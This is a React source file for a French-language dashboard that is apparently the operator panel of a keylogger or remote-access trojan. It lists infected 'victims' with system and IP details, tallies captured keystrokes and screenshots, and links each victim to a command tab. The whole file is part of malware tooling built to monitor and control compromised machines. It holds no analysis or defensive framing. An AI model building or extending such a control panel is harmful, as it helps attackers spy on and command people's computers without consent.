import React, { useState, useEffect } from 'react';
import {
  Grid,
  Paper,
  Typography,
  Box,
  Button,
  CircularProgress,
} from '@mui/material';
import {
  People as PeopleIcon,
  HowToReg as ActiveIcon,
  Keyboard as KeyboardIcon,
  Image as ImageIcon,
  Refresh as RefreshIcon,
  Assessment as ActivityIcon,
  Send as SendIcon,
  FileDownload as DownloadIcon,
  Settings as SettingsIcon,
} from '@mui/icons-material';
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from 'recharts';
import { DataGrid } from '@mui/x-data-grid';
import { useNavigate } from 'react-router-dom';
import { victimService } from '../services/api';
import StatsCard from '../components/StatsCard';

const Dashboard = () => {
  const [victims, setVictims] = useState([]);
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    keystrokes: 0,
    screenshots: 0,
  });
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  const [activityData, setActivityData] = useState([
    { name: 'Lun', victimes: 4 },
    { name: 'Mar', victimes: 7 },
    { name: 'Mer', victimes: 5 },
    { name: 'Jeu', victimes: 8 },
    { name: 'Ven', victimes: 12 },
    { name: 'Sam', victimes: 15 },
    { name: 'Dim', victimes: 10 },
  ]);

  useEffect(() => {
    fetchVictims();
  }, []);

  const fetchVictims = async () => {
    setLoading(true);
    try {
      const response = await victimService.getAllVictims();
      setVictims(response.data.victims);
      setStats(response.data.stats);
    } catch (error) {
      console.error('Error fetching victims:', error);
    } finally {
      setLoading(false);
    }
  };

  const columns = [
    {
      field: 'id',
      headerName: 'ID',
      width: 120,
      renderCell: (params) => (
        <Typography variant="body2" sx={{ fontFamily: 'monospace', color: 'primary.main' }}>
          {params.value.substring(0, 8)}...
        </Typography>
      ),
    },
    {
      field: 'status',
      headerName: 'Statut',
      width: 120,
      renderCell: (params) => (
        <Box
          sx={{
            backgroundColor: params.value === 'active' ? 'success.main' : 'grey.700',
            color: 'white',
            borderRadius: 1,
            px: 1,
            py: 0.5,
            fontSize: '0.75rem',
            fontWeight: 'bold',
            textTransform: 'uppercase',
            display: 'inline-block',
          }}
        >
          {params.value === 'active' ? 'Active' : 'Inactive'}
        </Box>
      ),
    },
    {
      field: 'platform',
      headerName: 'Système',
      width: 150,
      renderCell: (params) => {
        const systemInfo = JSON.parse(params.row.system_info || '{}');
        return `${systemInfo.platform || 'N/A'} ${systemInfo.platform_release || ''}`;
      },
    },
    {
      field: 'ip',
      headerName: 'Adresse IP',
      width: 150,
      renderCell: (params) => {
        const networkInfo = JSON.parse(params.row.network_info || '{}');
        return networkInfo.local_ip || 'N/A';
      },
    },
    {
      field: 'last_seen',
      headerName: 'Dernière activité',
      width: 180,
    },
    {
      field: 'actions',
      headerName: 'Actions',
      width: 200,
      sortable: false,
      renderCell: (params) => (
        <Box>
          <Button
            variant="contained"
            size="small"
            onClick={() => navigate(`/victim/${params.row.id}`)}
            sx={{ mr: 1 }}
          >
            Détails
          </Button>
          <Button
            variant="outlined"
            size="small"
            color="secondary"
            onClick={() => navigate(`/victim/${params.row.id}?tab=commands`)}
          >
            Commande
          </Button>
        </Box>
      ),
    },
  ];

  return (
    <Box>
      {/* En-tête du Dashboard */}
      <Box display="flex" justifyContent="space-between" alignItems="center" mb={3}>
        <Typography variant="h4" component="h1" color="text.primary">
          Tableau de Bord
        </Typography>
        <Button
          variant="contained"
          startIcon={<RefreshIcon />}
          onClick={fetchVictims}
          disabled={loading}
        >
          Actualiser
        </Button>
      </Box>

        {/* Cartes de Statistiques */}
        <Grid container spacing={3} mb={3}>
            <Grid item xs={12} sm={6} md={3}>
            <StatsCard
                title="Victimes Totales"
                value={stats.total}
                icon={<PeopleIcon sx={{ color: 'white', fontSize: 30 }} />}
                color="linear-gradient(45deg, #2979ff, #75a7ff)"
                sx={{ width: '100%', height: '100%' }}
            />
            </Grid>
            <Grid item xs={12} sm={6} md={3}>
            <StatsCard
                title="Victimes Actives"
                value={stats.active}
                icon={<ActiveIcon sx={{ color: 'white', fontSize: 30 }} />}
                color="linear-gradient(45deg, #00c853, #64dd17)"
                sx={{ width: '100%', height: '100%' }}
            />
            </Grid>
            <Grid item xs={12} sm={6} md={3}>
            <StatsCard
                title="Total Frappes"
                value={stats.keystrokes}
                icon={<KeyboardIcon sx={{ color: 'white', fontSize: 30 }} />}
                color="linear-gradient(45deg, #ff4081, #f50057)"
                sx={{ width: '100%', height: '100%' }}
            />
            </Grid>
            <Grid item xs={12} sm={6} md={3}>
            <StatsCard
                title="Captures d'écran"
                value={stats.screenshots}
                icon={<ImageIcon sx={{ color: 'white', fontSize: 30 }} />}
                color="linear-gradient(45deg, #ffa000, #ff6f00)"
                sx={{ width: '100%', height: '100%' }}
            />
            </Grid>
        </Grid>

      {/* --- NOUVEAU LAYOUT: Graphique et Actions --- */}
      <Box sx={{ display: 'flex', gap: 3, mb: 3 }}>
        {/* Conteneur du Graphique */}
        <Box sx={{ flexGrow: 1 }}>
          <Paper sx={{ p: 2, height: 350, display: 'flex', flexDirection: 'column', width: '100%' }}>
            <Typography variant="h6" component="h2" mb={2} color="text.primary">
              Activité des Victimes (7 derniers jours)
            </Typography>
            <ResponsiveContainer width="100%" height="100%">
              <LineChart data={activityData}>
                <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.1)" />
                <XAxis dataKey="name" stroke="#a0a0b8" />
                <YAxis stroke="#a0a0b8" />
                <Tooltip
                  contentStyle={{
                    backgroundColor: '#151521',
                    border: '1px solid rgba(255,255,255,0.1)',
                    borderRadius: '8px',
                  }}
                />
                <Line
                  type="monotone"
                  dataKey="victimes"
                  stroke="#2979ff"
                  strokeWidth={3}
                  dot={{ fill: '#75a7ff', r: 6 }}
                  activeDot={{ r: 8 }}
                />
              </LineChart>
            </ResponsiveContainer>
          </Paper>
        </Box>

        {/* Conteneur des Actions Rapides */}
        <Box sx={{ width: { xs: '100%', md: '30%' }, minWidth: { md: '280px' } }}>
          <Paper sx={{ p: 2, height: 350, display: 'flex', flexDirection: 'column', width: '100%' }}>
            <Typography variant="h6" component="h2" mb={2} color="text.primary">
              Actions Rapides
            </Typography>
            <Box sx={{ flexGrow: 1, display: 'flex', flexDirection: 'column', justifyContent: 'space-around' }}>
              <Button variant="outlined" fullWidth sx={{ mb: 1, p: 1.5 }}>
                Voir toutes les victimes
              </Button>
              <Button variant="outlined" fullWidth sx={{ mb: 1, p: 1.5 }}>
                Générer un rapport
              </Button>
              <Button variant="outlined" fullWidth color="secondary" sx={{ p: 1.5 }}>
                Paramètres avancés
              </Button>
            </Box>
          </Paper>
        </Box>
      </Box>

      {/* Tableau des Victimes */}
      <Paper sx={{ p: 2, height: 500, display: 'flex', flexDirection: 'column', width: '100%' }}>
        <Typography variant="h6" component="h2" mb={2} color="text.primary">
          Liste des Victimes Connectées
        </Typography>
        {loading ? (
          <Box display="flex" justifyContent="center" alignItems="center" height="400px">
            <CircularProgress color="primary" />
          </Box>
        ) : (
          <DataGrid
            rows={victims}
            columns={columns}
            pageSize={10}
            rowsPerPageOptions={[10]}
            disableSelectionOnClick
            getRowId={(row) => row.id}
            sx={{ flex: 1 }}
          />
        )}
      </Paper>
    </Box>
  );
};

export default Dashboard;